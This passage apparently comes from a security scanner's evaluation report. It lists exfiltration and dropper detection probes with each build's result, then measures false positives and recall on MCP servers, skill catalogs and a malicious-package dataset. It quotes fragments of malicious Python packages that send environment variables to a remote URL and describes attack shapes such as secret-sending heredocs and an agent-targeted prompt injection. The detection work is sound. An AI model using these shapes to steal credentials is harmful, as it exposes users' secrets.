| `x36_py_chr_url_plain_token` | URL built from char codes, the token sent as it is | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `x37_js_slice_by_length` | a count beside the value itself: slice(0, token.length) | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |

</details>

<details>
<summary>The first verification's 87 probes</summary>

| Probe | What it is | Expected | Chain | main 35c0155 | e45efc5 | port a442dad | 8f8fd64 | this branch 34eaa0b |
|---|---|---|---|---|---|---|---|---|
| `v01_sh_heredoc_curl` | curl reads the body from a heredoc that expands the secret | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `v02_sh_heredoc_quoted_delim` | a quoted heredoc delimiter expands nothing: the literal text $TOKEN is sent | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL |
| `v03_sh_heredoc_dash_json` | &lt;&lt;- heredoc with a JSON body that expands the secret | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `v04_sh_heredoc_unrelated_clean` | the heredoc sends a fixed body; the secret is used after the heredoc ends | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL |
| `v05_md_skill_heredoc_sweep` | SKILL.md bash block: secret-named env sweep sent through a heredoc | true | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | HIGH | CRITICAL, chain | CRITICAL, chain |
| `v06_sh_pipe_before_curl` | the secret is piped into curl from the line above the sink (shared miss: the window reads down from the sink) | true | EXFIL-CHAIN-001 | CRITICAL | CRITICAL | CRITICAL | CRITICAL | CRITICAL |
| `v07_rb_system_interp` | Ruby double-quoted string interpolates #{token} | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `v08_rb_backtick_interp` | Ruby backtick command interpolates #{token} | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `v09_rb_single_quoted_clean` | Ruby single-quoted string does not interpolate | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL |
| `v10_cs_interpolated` | C# $"...{key}" interpolates | true | EXFIL-CHAIN-001 | CRITICAL | CRITICAL | CRITICAL | CRITICAL | CRITICAL |
| `v11_swift_interpolated` | Swift \(key) interpolates | true | EXFIL-CHAIN-001 | LOW | LOW | LOW | LOW | LOW |
| `v12_kt_dollar` | Kotlin "$key" interpolates | true | EXFIL-CHAIN-001 | HIGH | HIGH | HIGH | HIGH | HIGH |
| `v13_py_set_literal` | a Python set literal holds the value | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v14_py_dict_comprehension` | a dict comprehension over the environment copy | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v15_py_statement_dict_key_tls` | statement mode: a Python dict keyed by the secret, verify=False | true | TLS-CHAIN-001 | CRITICAL | MEDIUM | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v16_py_statement_quoted_key_clean` | statement mode: a quoted key that repeats the name | clean | TLS-CHAIN-001 | CRITICAL | MEDIUM | MEDIUM | MEDIUM | MEDIUM |
| `v17_md_python_dict_key` | SKILL.md python block: dict keyed by the secret (Markdown is not read as Python) | true | EXFIL-CHAIN-001 | CRITICAL, chain | LOW | LOW | LOW | LOW |
| `v18_py_def_called_beyond_window` | a helper with a parameter of the bound name, called with the bound value 25 lines after the source | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | CRITICAL, chain | CRITICAL, chain |
| `v19_py_def_called_within_window` | the same helper called within the window | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v20_py_def_never_called_clean` | a helper whose parameter shares the name, called with a literal | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | LOW |
| `v21_py_lambda_on_sink_line` | lambda with a parameter of the bound name on the sink line, called with the value | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v22_js_method_called_this` | JS method with a parameter of the bound name, called with it | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v23_py_forwarded_name` | t = token; send(t) (the port's documented decision: not followed) | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | LOW |
| `v24_py_self_attr` | bound on self, sent from another method | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v25_js_this_attr` | bound on this, sent from another method | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v26_py_other_attr_clean` | another object's attribute of the same name | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | LOW |
| `v27_js_length_then_value` | a count, then the value itself in a ternary | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v28_py_len_only_clean` | only the length is sent | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | LOW |
| `v29_py_slice_with_len` | a slice bounded by len() still sends the value | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v30_py_b64_on_source_line` | the key is base64-encoded on the line that reads it | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v31_py_hex_in_url` | hex of the secret inside an f-string URL | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v32_js_regex_then_value` | a regex literal with a quote before the value | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v33_js_division_then_value` | a division that is not a regex literal | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v34_sh_same_line_with_comment` | source and sink in code, a comment after | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v35_py_source_only_in_comment_clean` | the credential read is only in the comment | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | LOW |
| `v36_js_same_line_code` | the secret in the call itself, a comment after | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v37_map_json_with_exfil_clean` | a JSON source map carrying an exfil flow as data (nothing in it runs) | clean | EXFIL-CHAIN-001 | LOW | LOW | LOW | LOW | LOW |
| `v38_map_named_python_script` | a Python script named .map (not JSON) is correlated | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v39_map_json_then_dropper` | a source map line followed by a dropper is not a source map | true | DROPPER-CHAIN-001 | MEDIUM, chain | MEDIUM, chain | MEDIUM, chain | MEDIUM, chain | MEDIUM, chain |
| `v40_py_urlretrieve_python_u` | interpreter flag before the operand | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `v41_py_literal_path_popen` | literal .pyz path written then launched | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `v42_ps_iwr_start_process` | PowerShell download then Start-Process with a window style | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `v43_sh_wget_bash_with_args` | bash "$BIN" followed by an argument | true | DROPPER-CHAIN-001 | LOW | LOW | LOW | LOW | LOW |
| `v44_py_b64_decoded_dest` | destination decoded from base64, downloaded and launched | true | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `v45_py_config_arg_clean` | a downloaded config handed to a fixed script | clean | DROPPER-CHAIN-001 | HIGH, chain | HIGH, chain | LOW | LOW | LOW |
| `v46_md_sweep_quoted_default` | SKILL.md: env sweep sent with a default expansion | true | AGENTSC-CHAIN-001 | CRITICAL, chain | HIGH | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v47_md_sweep_herestring` | SKILL.md: env sweep sent through a here-string | true | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v48_md_sweep_prose_mention_clean` | SKILL.md: a health check, then prose that mentions the variable | clean | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | HIGH | HIGH | HIGH |
| `v49_yaml_workflow_sweep` | GitHub Actions run block: sweep then send | true | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v50_md_tar_form_upload` | SKILL.md: project archive uploaded as a form field | true | AGENTSC-CHAIN-002 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `v51_sh_tar_upload_file_braces` | archive sent with --upload-file ${TARBALL} | true | AGENTSC-CHAIN-002 | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain | HIGH, chain |
| `v52_md_injection_inline_code` | prompt injection telling the agent to run an exfil one-liner | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v53_py_multiline_triple_fstring` | a triple-quoted f-string body over lines of the call | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v54_js_multiline_template` | a template literal over lines of the call | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `v55_py_socket_follow` | a socket assigned on the sink line, the key sent two lines down | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain | CRITICAL, chain |
| `l01_cs_interp` | C# $"" interpolation | true | EXFIL-CHAIN-001 | CRITICAL | CRITICAL | CRITICAL | CRITICAL | CRITICAL |
| `l02_cs_verbatim_interp` | C# $@"" interpolation | true | EXFIL-CHAIN-001 | CRITICAL | CRITICAL | CRITICAL | CRITICAL | CRITICAL |
| `l03_swift_interp` | Swift \() interpolation | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `l04_kotlin_template` | Kotlin ${{}} template | true | EXFIL-CHAIN-001 | CRITICAL | CRITICAL | CRITICAL | CRITICAL | CRITICAL |
| `l05_php_interp` | PHP "{{$key}}" | true | EXFIL-CHAIN-001 | CRITICAL | CRITICAL | CRITICAL | CRITICAL | CRITICAL |
| `l06_perl_interp` | Perl "$key" | true | EXFIL-CHAIN-001 | CRITICAL | CRITICAL | CRITICAL | CRITICAL | CRITICAL |
| `l07_ps_subexpr` | PowerShell "$($key)" | true | EXFIL-CHAIN-001 | CRITICAL | CRITICAL | CRITICAL | CRITICAL | CRITICAL |
| `l08_rb_interp` | Ruby "#{{}}" | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `l09_rb_heredoc` | Ruby squiggly heredoc interpolation as the body | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `l10_rb_percent_x` | Ruby %x() command | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `l11_rb_comment_clean` | Ruby: the name only in a trailing comment | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL |
| `w01_py_main_guard_far_call` | helper called from the __main__ guard, beyond the window | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | CRITICAL, chain | CRITICAL, chain |
| `w02_py_main_func_far_call` | helper called from main(), which uses the module value | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | CRITICAL, chain | CRITICAL, chain |
| `w03_py_main_func_local_clean` | main() calls the helper with its own local of the same name | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | LOW |
| `w04_py_module_reassigned_clean` | the module reassigns the name before the far call | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | LOW |
| `w05_js_far_call_require_main` | JS helper called under require.main, beyond the window | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | CRITICAL, chain | CRITICAL, chain |
| `w06_js_far_call_local_clean` | JS main() calls the helper with its own local | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | LOW |
| `w07_py_far_call_keyword` | far call passing the value as a keyword argument | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | CRITICAL, chain | CRITICAL, chain |
| `w08_py_far_call_param_of_caller_clean` | far call inside a function whose own parameter has the name | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | LOW |
| `w09_sh_arith_shift_clean` | $((1&lt;&lt;SHIFT)) on the sink line is not a heredoc | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL |
| `w10_sh_heredoc_other_command_clean` | a heredoc opened by another command after the request | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL |
| `w11_sh_heredoc_backslash_clean` | &lt;&lt;\EOT expands nothing | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL |
| `w12_sh_heredoc_space` | &lt;&lt; EOT with a space | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `w13_sh_heredoc_continued_call` | heredoc opened on a continuation line of the call | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `w14_rb_heredoc_single_quoted_clean` | Ruby &lt;&lt;~'EOS' does not interpolate | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL |
| `w15_js_backslash_paren_clean` | \( in a JavaScript string is not interpolation | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | LOW | LOW | LOW |
| `w16_cs_interp_webhook` | C# $"" field sent to a webhook | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL, chain |
| `w17_cs_plain_braces_clean` | C# plain string: {key} is text | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL |
| `w18_swift_plain_clean` | Swift: the name only as text in a string | clean | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL | CRITICAL |
| `w19_md_heredoc_quoted_clean` | SKILL.md: a quoted heredoc sends the literal text | clean | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | HIGH | HIGH | HIGH |
| `w20_yaml_heredoc_sweep` | GitHub Actions run block: sweep sent through a heredoc | true | AGENTSC-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | HIGH | CRITICAL, chain | CRITICAL, chain |
| `w21_noext_heredoc` | an extensionless shell script (read as it is) with a heredoc | true | EXFIL-CHAIN-001 | CRITICAL, chain | CRITICAL, chain | CRITICAL | CRITICAL, chain | CRITICAL, chain |

</details>

## Measurements

The release build of this branch (34eaa0b) was run on every corpus and
compared, sample by sample in both directions, with the release build of main
(35c0155): every level change, every change of rule set or finding count,
every correlation chain that moved. Main predates the whole branch (the MCP
false-positive pass, #169, #170 and this port), so the clean MCP servers and
the Datadog packages were also run with e45efc5, the branch before the port,
which isolates the port's own effect.

```
Data Source: Real samples. Clean MCP servers: 169 packages from the official
             MCP registry (evaluation_results/corpora/mcp_clean_manifest.json),
             and the 146-server holdout of other popular registry servers not
             used for calibration (evaluation_results/corpora/
             mcp_holdout146_manifest.json; not the 157-server reconstruction
             in mcp_holdout_manifest.json that source-map-correlation.md
             measured, nor the re-derived 157 of correlation-names.md).
             Skills: Datadog malicious-software-packages-dataset ai-skills
             bucket (204 malicious); anthropics, NVIDIA, openai and
             vercel-labs skill catalogs (455 clean). Datadog: run_eval.py's
             selection of the malicious-software-packages-dataset (--limit
             204; dataset commit 1dbcfc5, fingerprint 63fcde5b...).
             SkillSpector's own test suite (the parity corpus).
Sample Size: 169 + 146 MCP servers; 204 malicious and 455 clean skills;
             844 Datadog malicious packages; 1,796 SkillSpector test
             examples. Each scanned once per build: main and this branch on
             every corpus, e45efc5 on the 169 servers and the 844 packages.
Limitations: The MCP (169) and skills corpora are in-sample for the rules
             around the chains. Only a handful of samples in any corpus carry
             a chain, so these corpora show what moved on real code, not how
             often each probe shape occurs. "Clean" means published by a
             vendor or in the registry, not audited. Datadog is malicious
             packages only, scanned with run_eval.py's six detection phases;
             its per-sample comparison is scripts/datadog_diff.py, which
             imports run_eval.py's selection, extraction and reduction and
             runs its scan command with each build and an empty HOME. One run
             per build on a 4-core machine (--workers 2, no build running);
             no run reported PROV-BUDGET-001. The main and e45efc5 runs of
             the MCP, skills and parity corpora were made earlier the same
             day with the same binaries, beside runs of the 8f8fd64 build,
             whose results on those corpora 34eaa0b reproduces exactly.
```

| Corpus | main 35c0155 | This branch 34eaa0b | Level changes (main → branch) | Correlation chains that moved (main → branch) | e45efc5 → this branch |
|---|---|---|---|---|---|
| Clean MCP servers (169) | 39 blocked, 125 warned, 163 with any finding | 24 blocked, 76 warned, 163 | 62, all down: 47 MEDIUM → LOW, 8 HIGH → MEDIUM, 5 CRITICAL → MEDIUM, 1 CRITICAL → LOW, 1 HIGH → LOW | none; no correlation chain fires with either build | nothing: every server has the same level, rules and finding count |
| Unseen MCP servers (146) | 80 blocked, 135 warned, 144 | 66 blocked, 114 warned, 144 | 34, all down: 20 MEDIUM → LOW, 12 HIGH → MEDIUM, 1 CRITICAL → MEDIUM, 1 HIGH → LOW | DROPPER-CHAIN-001 leaves 2 servers (below) | not run (8f8fd64 and 34eaa0b are identical on all 146) |
| Malicious skills (204) | 173 blocked, 184 warned, 190 | the same | none | none: EXFIL-CHAIN-001 on 4 and AGENTSC-CHAIN-002 on 4 with both builds, the same skills | not run |
| Clean skills (455) | 7 blocked, 71 warned, 224 | the same | none | none: TLS-CHAIN-001 on 1 (openai `render-deploy`) with both | not run |
| Datadog malicious packages (844) | detected at any severity 785, ≥ Medium 761, ≥ High 752, ≥ Critical 561 | 785, 761, 752, **560** | 1 highest-severity change: `artifact-lab-3-package-b1ec2b9f` 0.2.3, Critical → High (CRITICAL → HIGH RISK), below | EXFIL-CHAIN-001 leaves 21 packages (22 findings), all `artifact-lab-3-package` versions; no chain is gained; DROPPER-CHAIN-001 on 7, DESER-CHAIN-001 on 16, AGENTSC-CHAIN-002 on 4 and TLS-CHAIN-001 on 1 are unchanged | 17 of the 21 already left with e45efc5 (#169's reading); the port removes EXFIL-CHAIN-001 from 4 more (5 findings), one of them the Critical → High above |
| SkillSpector's test examples (1,796) | 626 flagged at any severity, 385 at High or above | the same | none | none: EXFIL-CHAIN-001 on 9 with both; no example's rule set changed | not run |

Blocked is HIGH or CRITICAL RISK, warned MEDIUM RISK or above. The
per-sample files are in `evaluation_results/skills_benchmark/`:
`mcp_sigil_round3`, `mcp_holdout_sigil_round3`, `sigil_round3` and
`parity_sigil_round3` (`.json` with every sample, `.md` with every change),
and `datadog_round3_diff.json`; the Datadog aggregate is
`evaluation_results/honest_detection_eval_round3.{md,json}`.

### What moved, and why

**The MCP level changes are the false-positive pass, not the port.** On the
169 servers e45efc5 and this branch agree on every server's level, rule set
and finding count, and no correlation chain fires there with any build; the
62 down-moves are the pass's ([mcp-server-calibration.md](mcp-server-calibration.md#re-measured-on-the-merged-branch)).
Rescanning each changed server with both builds and listing the rules that
were at or above the old level with main and are below it (or gone) with
this branch gives, per server, what held the old level; the counts over the
62 and the 34:

| What held the old level with main (rescan of each changed server with both builds) | Clean MCP (62) | Unseen MCP (34) |
|---|---:|---:|
| INSTALL-004 on a `prepublishOnly` or build-only `prepare` (now INSTALL-009 / INSTALL-012, Low) | 23 | 6 |
| The same, together with a shipped source map (HYGIENE-001, now Low) | 13 | 4 |
| A shipped source map alone (HYGIENE-001) | 5 | 10 |
| High findings kept, no longer backed by an install-time action (the INSTALL-004 above became INSTALL-009 / 012): HIGH → MEDIUM | 3 | 8 |
| Name-shaped values: CRED-007, CRED-008, CRED-011 (one also SUPPLY-008; the unseen one keeps 2 of its 5 CRED-008 findings) | 9 | 1 |
| A platform package's own postinstall and launcher: INSTALL-003 and CODE-014 (now INSTALL-010, CODE-016), SKILL-006 on `package.json` | 4 | 0 |
| Method definitions read as calls: CODE-002 | 1 | 3 |
| `new Function` duplicate: CODE-009 (now Low), once with OBFUSC-CHAIN-011's arity-wrapper exemption | 2 | 0 |
| Bounded spans: SUPPLY-008; SUPPLY-011 / 013 / 016; INFER-004 / 005 | 1 | 2 |
| A literal client key made corroborating: INFER-007 | 1 | 0 |
| Total | 62 | 34 |

Every server's row is in the `.md` files ("Rules below the old level after
(rescan)"). No correlation rule is among them. The rule-set changes at an
unchanged level (27 clean servers and 71 unseen ones; among the skills, one
malicious skill loses SKILL-006 on `package.json` and one clean skill a
CRED-007 on a name-shaped value, and e45efc5 gives both the same findings as
this branch) are the same pass's content-rule changes; none involves a
correlation rule either.

**Two DROPPER-CHAIN-001 findings on the unseen servers, removed: false
positives.** `com.vibgrate__ai-context` (`package/dist/cli.js.map`, one line
of 2.7 MB) and `dev.jasonpearson__auto-mobile`
(`package/dist/src/index.js.map`, one line of 13.4 MB) each carried
`NET-012 (@L1) reaches CODE-RUNFILE-001 (@L1)` with main: a same-line link
inside a source map, whose `sourcesContent` embeds the source of many modules
as JSON string data, so a `curl` in one module and a launch in another sit on
the same "line". Nothing in a source map runs; #170 leaves source maps out of
correlation, whatever a chain's `name_uses`. Both servers stay CRITICAL RISK
on other rules, with one finding fewer each.

**Datadog: 21 `artifact-lab-3-package` samples lose EXFIL-CHAIN-001, and one
of them its CRITICAL verdict: the cost of not following a derived name.**
Every chain that moved on the 844 is an EXFIL-CHAIN-001 finding lost on a
version of one PyPI family; nothing was gained, and no other chain moved.

- **17, lost with e45efc5 already** (#169's reading, measured in
  [correlation-names.md](correlation-names.md#what-reading-names-as-values-changed)):
  `data = dict(os.environ)`, then `encoded_data =
  urllib.parse.urlencode(data)`, then `Request(url, data=encoded_data)`; the
  old reading linked it through the keyword `data=`. All stay CRITICAL RISK,
  with NET-007 among their rules. This is the shape
  `exfil_chain_does_not_follow_a_two_hop_flow` pins, and the one the lane's
  narrower hop restored.
- **4 more, lost with the port** (5 findings), each the same derived-name
  flow that e45efc5 linked through a line that is not the send. In
  `artifact-lab-3-package-4c04b1a2` 1.0.4 the ngrok URL line (NET-007) comes
  before `encoded_data = urllib.parse.urlencode(data)`, and e45efc5 read the
  four lines after the URL line, which include that derivation. In 1.0.5 the
  derivation comes first, and e45efc5 linked through a comment in those four
  lines (`# ... for URL-encoded data`). The port reads a destination line's
  window as the lines that use the name it assigns (`url`), which is
  `Request(url, data=encoded_data)`: the two hops pinned above, with the
  lines in another order. `artifact-lab-3-package-736f752d` 0.1.1 and
  `artifact-lab-3-package-b1ec2b9f` 0.2.3 build `env = str(os.environ)`, then
  `benv`, `b64envb`, `b64env` and `data = {"vars": b64env}`, and send
  `requests.post(url, data=data)`, block after block; e45efc5 linked only
  because its window ran past a call into the next block, whose `benv =
  env.encode("ascii")` uses the name as a value (the false-positive lens's
  first finding: a window past the sink's call). 4c04b1a2 and 736f752d stay
  CRITICAL RISK on other rules; **b1ec2b9f 0.2.3 drops to HIGH RISK** (its
  highest severity from Critical to High), so Datadog recall at Critical goes
  from 561 to 560 of 844. Recall at any severity, Medium and High is
  unchanged (785 / 761 / 752).

Following a derived name would restore all 21; it was measured and not
adopted ([correlation-names.md](correlation-names.md)), and widening the
window back past the sink's call would bring back the 23 clean probes of
the false-positive lens's first finding. The loss is reported, not fixed.
`scripts/run_eval.py --dataset datadog --limit 204` itself, run with this
branch's release build and an empty HOME, gives the same figures: 844
scanned, no extraction failure or scan error, 785 / 761 / 752 / 560
(`evaluation_results/honest_detection_eval_round3.md`).

The lane's own build (d89c600, with its one-hop follow) was measured on the
same corpora before the port; its per-sample files were replaced by the ones
above, because no build on this branch carries that follow. Its result, from
the lane's report: no level change against cff3fa2 on any corpus, the same two
source-map DROPPER-CHAIN-001 removals, and EXFIL-CHAIN-001 on 40 Datadog
packages, the 17 `artifact-lab-3-package` samples included.
